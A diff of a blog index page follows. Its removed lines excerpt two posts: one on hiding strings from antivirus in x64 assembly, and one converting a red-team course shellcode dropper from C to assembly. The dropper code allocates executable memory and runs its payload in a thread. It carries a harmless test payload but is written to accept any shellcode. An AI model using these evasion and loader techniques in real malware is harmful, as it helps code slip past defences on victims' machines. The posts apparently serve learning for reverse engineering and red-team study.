-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">w</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">3</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">4</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">r</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">5</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">s</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">6</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">h</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">7</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">8</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">9</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">10</span><span class="p">],</span><span class="w"> </span><span class="mi">0x0</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span>
-</code></pre></div>
-
-<hr />
-<p>With this final version of the code, "notepad" will not be visible to <code>strings</code> anymore.</p>
-<p>Here is our final code:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">bits</span><span class="w"> </span><span class="mi">64</span>
-<span class="w">    </span><span class="nf">default</span><span class="w"> </span><span class="no">rel</span>
-
-<span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
-<span class="w">    </span><span class="nf">msg_open</span><span class="w">    </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">open</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-
-<span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
-<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ShellExecuteA</span>
-
-<span class="nl">main:</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w">     </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
-
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x5</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x0</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
-
-<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">n</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">o</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">t</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">3</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">4</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">p</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">5</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">a</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">6</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">d</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">7</span><span class="p">],</span><span class="w"> </span><span class="mi">0x0</span><span class="w">   </span>
-<span class="w">    </span><span class="no">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_open</span><span class="p">]</span><span class="w"> </span>
-<span class="w">    </span><span class="no">xor</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rcx</span><span class="w">    </span>
-
-<span class="w">    </span><span class="no">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ShellExecuteA</span>
-<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-
-<span class="w">    </span><span class="nf">xor</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ExitProcess</span>
-</code></pre></div>
-
-<h2 id="hiding-at-scale">Hiding at scale</h2>
-<p>Writing the code above can get a little tedious especially if we want to pass a really long string. Thankfully, we can use a macro like the one I've written below:</p>
-<div class="codehilite"><pre><span></span><code><span class="err">%</span><span class="nf">macro</span><span class="w">  </span><span class="no">addstr2stack</span><span class="w">    </span><span class="mi">1</span><span class="p">-*</span>
-<span class="w">    </span><span class="err">%</span><span class="nf">assign</span><span class="w"> </span><span class="no">i</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="err">%</span><span class="nf">assign</span><span class="w"> </span><span class="no">j</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="err">%</span><span class="na">rep</span><span class="w">    </span><span class="err">%0</span>
-<span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="no">i</span><span class="err">+</span><span class="mi">8</span><span class="p">*</span><span class="no">j</span><span class="p">],</span><span class="w"> </span><span class="err">%</span><span class="mi">1</span>
-<span class="w">        </span><span class="err">%</span><span class="nf">assign</span><span class="w"> </span><span class="no">i</span><span class="w"> </span><span class="no">i</span><span class="err">+</span><span class="mi">1</span>
-<span class="w">        </span><span class="err">%</span><span class="nf">rotate</span><span class="w"> </span><span class="mi">1</span>
-
-<span class="w">        </span><span class="err">%</span><span class="nf">if</span><span class="w"> </span><span class="no">i</span><span class="w"> </span><span class="err">&gt;=</span><span class="w"> </span><span class="mi">8</span>
-<span class="w">            </span><span class="err">%</span><span class="nf">assign</span><span class="w"> </span><span class="no">j</span><span class="w"> </span><span class="no">j</span><span class="err">+</span><span class="mi">1</span>
-<span class="w">            </span><span class="err">%</span><span class="nf">assign</span><span class="w"> </span><span class="no">i</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">        </span><span class="err">%</span><span class="nf">endif</span>
-<span class="w">    </span><span class="err">%</span><span class="nf">endrep</span>
-<span class="err">%</span><span class="nf">endmacro</span>
-</code></pre></div>
-
-<p>What the macro does is that it loops through each character and places it into the correct position on the stack.</p>
-<blockquote>
-<p><strong>Important note:</strong> When reserving space on the stack, make sure it is in multiples of 16! This is because the stack has a 16-bit boundary for stack alignment! </p>
-<p>For example, if our string has 10 characters, we only need to reserve 16 bytes. If our character is 20 characters long, we'd have to reserve 32 bytes.</p>
-</blockquote>
-<p>This macro can then be called like this:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">        </span><span class="c1">; Reserve space for the string on the stack</span>
-<span class="w">    </span><span class="nf">addstr2stack</span><span class="w"> </span><span class="err">&quot;</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">o</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">t</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">p</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">a</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">d</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0x0</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">        </span><span class="c1">; After use, release the space</span>
-</code></pre></div>
-
-<p>Here is what the result of the macro looks like in the debugger:</p>
-<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-1-05" src="../images/string-anti-virus-evasion-in-x64-assembly-part-1-05.png" /></p>
-<p>For the full source code visit the repo <a href="https://github.com/accidentalrebel/string-anti-virus-evasion-x64-assembly">on Github</a>. Updates and fixes to the code will be pushed there.</p>
-<hr />
-<p>So there you have it, we were able to successfully hide strings by changing the way how the data is declared and placed in memory. If you think about it, the technique is very simple.</p>
-<p>However, we've only seen it used against the <code>strings</code> command. Can it evade an actual anti-virus? The answer is probably no. In my next post I'll be talking about API call obfuscation that would help hide functions like <code>ShellExecute</code>.</p>
-<p><strong>Edit: <a href="string-av-evasion-in-x64-assembly-part-1">Part 2 here</a></strong></p>
-<blockquote>
-<p>. Also, for any questions or comments, feel free to reach out to me on <a href="https://twitter.com/accidentalrebel">Twitter</a> or <a href="https://www.linkedin.com/in/juan-karlo-licudine/">LinkedIn</a>.</p>
-</blockquote>
+<p>We could use <a href="https://wiki.call-cc.org/man/5/Module%20(chicken%20foreign)#foreign-lambda"><code>foreign-lambda</code></a> to bind to the function:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">(</span><span class="k">define</span><span class="w"> </span><span class="nv">vec3_create</span>
+<span class="w">  </span><span class="p">(</span><span class="nf">foreign-lambda</span>
+<span class="w">    </span><span class="p">(</span><span class="nf">c-pointer</span><span class="w"> </span><span class="p">(</span><span class="nf">struct</span><span class="w"> </span><span class="s">&quot;Vec3&quot;</span><span class="p">))</span><span class="w">   </span><span class="c1">; Return type, a pointer to a struct object of Vec3</span>
+<span class="w">    </span><span class="s">&quot;Vec3Create&quot;</span><span class="w">                  </span><span class="c1">; Name fo the function</span>
+<span class="w">    </span><span class="nv">float</span><span class="w"> </span><span class="nv">float</span><span class="w"> </span><span class="nv">float</span><span class="p">))</span><span class="w">           </span><span class="c1">; The …</span></code></pre></div>
+            <a href="../chicken-scheme-ffi-examples.html" class="read-more">Read more &rarr;</a>
         </div>
 
         <div class="tags">
-            <a href="../tag/evasion.html" class="tag">evasion</a>
-            <a href="../tag/assembly.html" class="tag">assembly</a>
-            <a href="../tag/av.html" class="tag">av</a>
+            <a href="../tag/programming.html" class="tag">programming</a>
+            <a href="../tag/dev.html" class="tag">dev</a>
+            <a href="../tag/research.html" class="tag">research</a>
+            <span class="tag">+1 more</span>
         </div>
     </article>
     <article class="post-item">
         <header class="article-header">
+            <a href="../category/game_engine.html" class="article-category-label">game_engine</a>
             <h2 class="post-title">
-                <a href="../converting-a-malware-dropper-to-x64-assembly.html">Converting a malware dropper to x64 assembly</a>
+                <a href="../switching-from-c-c---to-c.html">#5 - Switching from C/C++ to C</a>
             </h2>
             <div class="article-meta">
-                <time datetime="2022-07-03T09:18:00+08:00">Sun 03 July 2022</time>
-                <span>•</span>
-                <a href="../category/misc.html">misc</a>
+                <time datetime="2020-05-19T17:59:00+08:00">Tue 19 May 2020</time>
             </div>
         </header>
 
         <div class="article-content">
-            <p>In this post I'll be listing down lessons I learned while converting a simple malware dropper written in C to x64 assembly. </p>
-<p>I started this project as a way to deepen my understanding of assembly so I could be better in malware development and reverse engineering (And also because I love coding in assembly and would always find an excuse to use it).</p>
-<h2 id="what-to-expect">What to expect</h2>
-<p>I'll be going through sections of the C file and show the how it can be written accordingly in x64 Windows assembly. Take note, however, that the conversion is not one-to-one, meaning there are other ways of writing it. What I did was to structure the assembly code so that you can easily compare it with the C code while making sure that the end result will be the same.</p>
-<p>I won't be covering the basics of assembly because <a href="https://sonictk.github.io/asm_tutorial/">this post</a> does a better job of doing that. And as for the assembler, I'll be using <a href="https://www.nasm.us/">nasm</a> because this is the one I'm most familiar with.</p>
-<blockquote>
-<p><strong>Disclaimer:</strong> I am not an expert in any of these topics. I'm just someone who learned things and wish to share it to others. If I'm wrong about anything feel free to point it out. </p>
-</blockquote>
-<h2 id="credits">Credits</h2>
-<p>The malware dropper that we'll be converting is made by <a href="https://twitter.com/sektor7net">@reenz0h</a>. I found it in <a href="https://github.com/kymb0/Malware_learns">kymb0's repository</a> and I learned that it's a part of the <a href="https://institute.sektor7.net/">Red Team Operator course by Sektor7</a>. I've read good things about the course and I plan to take it in the future, you should check it out too.</p>
-<h2 id="the-dropper">The dropper</h2>
-<p>Here's the malware dropper that we'll be converting:</p>
-<div class="codehilite"><pre><span></span><code><span class="cm">/*</span>
-
-<span class="cm"> Red Team Operator course code template</span>
-<span class="cm"> storing payload in .data section</span>
-
-<span class="cm"> author: reenz0h (twitter: @sektor7net)</span>
-
-<span class="cm">*/</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
-
-<span class="c1">// 4 byte payload</span>
-<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">payload</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
-<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
-<span class="w">    </span><span class="mh">0xcc</span><span class="p">,</span><span class="w">       </span><span class="c1">// INT3</span>
-<span class="w">    </span><span class="mh">0xc3</span><span class="w">        </span><span class="c1">// RET</span>
-<span class="p">};</span>
-<span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">payload_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>
-
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-
-<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">exec_mem</span><span class="p">;</span>
-<span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
-<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">th</span><span class="p">;</span>
-<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">oldprotect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
-
-<span class="w">    </span><span class="c1">// Allocate a memory buffer for payload.</span>
-<span class="w">    </span><span class="n">exec_mem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">,</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="p">);</span>
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;payload addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">);</span>
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;exec_mem addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
-
-<span class="w">    </span><span class="c1">// Copy payload to new buffer</span>
-<span class="w">    </span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">);</span>
-
-<span class="w">    </span><span class="c1">// Make new buffer as executable</span>
-<span class="w">    </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
-
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Hit me!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-<span class="w">    </span><span class="n">getchar</span><span class="p">();</span>
-
-<span class="w">    </span><span class="c1">// If all good, run the payload</span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">rv</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="n">th</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="w"> </span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
-<span class="w">            </span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>Here is what the code does:</p>
-<ul>
-<li>Allocates memory buffer with size <code>payload_len</code></li>
-<li>Copies <code>payload</code> to the buffer</li>
-<li>The buffer's memory protection is changed to <code>PAGE_EXECUTE_READ</code> which allows for code execution</li>
-<li>A thread is created that runs the payload, which runs indefinitely</li>
-</ul>
-<p>It doesn't seem that the program is doing much when run. All we see are the payload and exec_mem addresses for debugging purposes and nothing much else.</p>
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-01" src="../images/converting-a-malware-dropper-to-x64-assembly-01.png" /></p>
-<p>The most interesting parts with this code will be seen under a debugger, which I'll go through later in this post.</p>
-<h2 id="including-external-functions">Including external functions</h2>
-<p>In C, if we want to to use a Windows API function, we need to include the necessary header files and make sure to supply required library names via the linker, like so:</p>
-<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
-</code></pre></div>
-
-<p>x64 assembly does not use header files so the process is done differently. First, the necessary ".lib" files should be supplied to the linker:</p>
-<div class="codehilite"><pre><span></span><code>link<span class="w"> </span>dropper_data.obj<span class="w"> </span>/subsystem:console<span class="w"> </span>/out:dropper_data.exe<span class="w"> </span>kernel32.lib<span class="w"> </span>msvcrt.lib
-</code></pre></div>
-
-<p>Next, every external function that we'll be using in our code needs to be specified as shown below:</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
-<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">printf</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualAlloc</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualProtect</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">RtlMoveMemory</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">getchar</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">CreateThread</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">WaitForSingleObject</span>
-</code></pre></div>
-
-<p>Note that the <code>extern</code> keyword in assembly is different in C. Externs in C are used for <em>exporting</em> symbols while they are used for <em>importing</em> symbols in Assembly. <code>global</code> is the one used for exporting.</p>
-<p>Once the symbols are properly exported then that is when the functions can be used with the <code>call</code> operand.</p>
-<h2 id="the-entrypoint">The entrypoint</h2>
-<p>There needs to be an entry point so that the operating system knows where to jump to start our program. We do this in C by declaring a <code>main</code> function:</p>
-<div class="codehilite"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="p">...</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>In assembly, we declare the entry point with <code>global main</code> (As seen in the previous section) and also supply the <code>main:</code> label within the code. This is where execution will jump to.</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
-<span class="w">   </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
-<span class="w">   </span><span class="na">...</span>
-<span class="w">   </span><span class="na">...</span>
-
-<span class="nl">main:</span>
-<span class="w">   </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
-<span class="w">   </span><span class="na">...</span>
-<span class="w">   </span><span class="na">...</span>
-</code></pre></div>
-
-<h2 id="the-payload">The payload</h2>
-<p>The payload in this example is a simple shellcode made for testing purposes. This can be changed to any shellcode of any length as long as <code>payload_len</code> reflects the new size of the shellcode.</p>
-<div class="codehilite"><pre><span></span><code><span class="c1">// 4 byte payload</span>
-<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">payload</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
-<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
-<span class="w">    </span><span class="mh">0xcc</span><span class="p">,</span><span class="w">       </span><span class="c1">// INT3</span>
-<span class="w">    </span><span class="mh">0xc3</span><span class="w">        </span><span class="c1">// RET</span>
-<span class="p">};</span>
-<span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">payload_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>
-</code></pre></div>
-
-<p>In assembly, initializing data is done in <code>segment .data</code>.</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="c1">;; 4 byte payload</span>
-<span class="w">    </span><span class="nf">payload</span><span class="w">         </span><span class="no">db</span><span class="w">  </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0xCC</span><span class="p">,</span><span class="w"> </span><span class="mi">0xC3</span>
-<span class="w">    </span><span class="nf">payload_len</span><span class="w">     </span><span class="no">db</span><span class="w">  </span><span class="mi">4</span>
-</code></pre></div>
-
-<p>We can then check the above data laid out in the <code>.data</code> memory segment using a debugger:</p>
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-02" src="../images/converting-a-malware-dropper-to-x64-assembly-02.png" /></p>
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-03" src="../images/converting-a-malware-dropper-to-x64-assembly-03.png" /></p>
-<p>You may notice that our shellcode is not at the start of the <code>.data</code> segment because there are other data that was declared prior to our payload. This is important to note as the order we declare the data will be the order they will appear in memory.</p>
-<h2 id="initialized-data">Initialized data</h2>
-<p>All data in assembly needs to be declared and initialized before it can be used:</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
-<span class="w">    </span><span class="nf">msg_hello</span><span class="w">       </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hello</span><span class="w"> </span><span class="no">world</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_exec_addr</span><span class="w">   </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">exec_mem</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_pload_addr</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">payload</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">   </span>
